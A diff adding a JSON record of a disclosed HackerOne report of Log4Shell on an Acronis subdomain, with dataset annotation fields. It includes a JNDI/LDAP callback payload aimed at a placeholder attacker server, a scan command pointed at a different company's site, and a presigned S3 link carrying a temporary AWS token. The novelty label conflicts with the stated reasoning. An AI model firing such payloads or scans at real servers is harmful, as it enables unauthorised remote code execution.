@@ -1,0 +1,40 @@
+{
+  "reported_to": "Acronis",
+  "reported_by": "rhinestonecowboy ",
+  "title": "[CVE-2021-44228] nps.acronis.com is vulnerable to the recent log4shell 0-day",
+  "content": "\nSummary\nThe website at nps.acronis.com is vulnerable to CVE-2021-44228\nSteps To Reproduce\nI used this script to find this. It spins up an interact-sh server to receive the callback and send the payload in the query string and about 30 diffent headers. You can reproduce manually with curl and interact-sh/burp collaborator/a server you control. However, since the callback is proof of the vulnerability, the script makes it easier to identify. Let me know if you want me to tell you which specific header fires the payload and I will test them.\nConstruct the payload: ${jdni:ldap://nps.acronis.com.<your-server>/test}\nInject the payload in the Request Headers (User Agent, X-Forwarded-For etc) or use the script from fullscan: python3 log4j-scan.py -u 'https://marketingportal.engelvoelkers.com'\nObserve the callback, proving the deserialization of untrusted data which leads to rce\n<image_0>\nRecommendations\nUpdate log4j to the latest version\nIf updating to the latest version is not possible the vulnerability can be mitigated by removing the JndiLookup class from the class path. Additionally, the issue can be mitigated on Log4j versions >=2.10 by setting the system property log4j2.formatMsgNoLookups or the LOG4J_FORMAT_MSG_NO_LOOKUPS environment variable to true.\nImpact\nRemote Code Execution (rce)\n\n",
+  "severity": [
+    10.0,
+    null
+  ],
+  "bounty": 1000,
+  "weaknesses": [
+    "Deserialization of Untrusted Data"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/j3gt4ho398sl4wfb7lu8810vfxqm?response-content-disposition=attachment%3B%20filename%3D%222021-12-14-013717_1366x768_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272021-12-14-013717_1366x768_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUSHEZPI%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T022444Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCBwvB2H4R3c4ZV70J6H%2FIT4w5H5AiZuTjZVd68imYeDAIgBryezpLfP1Ej5TGoDWTLi1Ptiwj85BMdHe8ZMZps1HYquwUI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDxZ66JcfrIIHUEAfiqPBcZqoAg%2FnFOhPtQEno3eNbR1uLK9MwS5wgXctAX0tjot02BeAM%2BHHafvlkaEkKzsx%2BJBFsn%2FftAxXuhx1MBYKVYgG7jAJO0xb1EOl7nJhP2dHcAogh4ohTX6WLC29t7oYvt%2F9SOVlm0s7%2BPkQtz0YbZnceV9E5MTgp63wUujfTpS9lgogAhxjrspwp7g%2FVE8d1oc7rPWURJWlt%2BDcQXgTsh%2FaabhklI3Sl77KcnFeFjXJi65mJXmw6luH%2BD7X0RJ1dDnLNA%2FIwuVjTv2kZVpgWxXU%2B3yKBeM%2FyadPujPSRqvrsrLkWD%2FUMedIJK9965t23t0y6yC%2Fog1oZmdbvz7Boyt6L8osS%2BH4070I%2FlIojo5DqUAT1ZoKf0w5gA87zJWUdGqWPLOfUWo8ndDqdgkyqk8%2BY50%2BSEGabfVMOaMgKJwaA4zyTa%2B0EPK7sCIqlkdJcKUuGwOtfmgTS26D%2BYDdL25n9h0Vb1hjld2PKgnzUZTJvcBKbMZD%2F1btU4muJCcceTTcPUUZgADjVaLa%2BEVEEJNIpC3yPdhgMDOhPmkSYimLFEMQgPJGl5qNSAdTnO5Mjdk9ZBjMxtE83P5txeCOzVBVgBPUhnrxsgNZlUI4BncKueFrY9ZJAqvNTe2KjneDH4kOyVsXLn7tn4Kj9Y8JiaV7ob0q0iZ534PyUOK9GfPcHFQQr24pzlQTu8V25%2FbhD1O6W7VShb5bb%2BKfMpK18VE0udRr36jY6ShfbReolJOTpNdCvil1RedQi0thIcw4U%2FjGNgAQr9LClqW7eHzLPJDc7%2FOEzgyVSTGMyLqyOqKIkQpwRJnpGYCX2w22rAsbU4qCDfKl9IAjg6RpKQCmtv4sbqsx3t6m4Y3Du7ASaUw4%2F6HvwY6sQHwzRx6WXAMp6889QJYZa7IqLXqkllcBSrLkt%2F3ZgrgqooaLZZ%2BfdXl2hPUKOlBtBWs%2BrXUWnwZYKDcUa9vd7QWQ%2FenNDduzWbRMDXrgNguOAv5ovMCtQhrmlBZzXWhxSk5i7o3DW1vnF2CzECUpVizCIDS5hAuT7JVJTEsXc0w3l9RA8sKcY78Wp2M7msG5BzeAR6yMAdt5G5By%2B2%2BgWtFqM93zDNItV%2FD8wPxKTnyflQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=34f9dd7208b8392abf8b12a1638cf5e5b3ac74c18f5c32d0ae4b673da886e1ce"
+  },
+  "disclosed_date": 1657686360,
+  "report_url": "https://hackerone.com/reports/1425474",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Construct the payload: ${jndi:ldap://nps.acronis.com.<your-server>/test}"
+    ],
+    [
+      2,
+      "Inject the payload in the Request Headers (User Agent, X-Forwarded-For etc) or use a script to automate the process"
+    ]
+  ],
+  "vuln_description": "The website at nps.acronis.com is vulnerable to CVE-2021-44228 (Log4Shell), which allows remote code execution via the Log4j library's JNDI lookup feature. By injecting a crafted payload into HTTP headers, an attacker can trigger the vulnerability and potentially execute arbitrary code on the server.",
+  "reason": "The attack involves a straightforward injection of a well-known payload into common HTTP headers. The vulnerability is widely publicized, and the steps to reproduce are well-documented and simple to execute. No complex interactions or novel logic are required.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
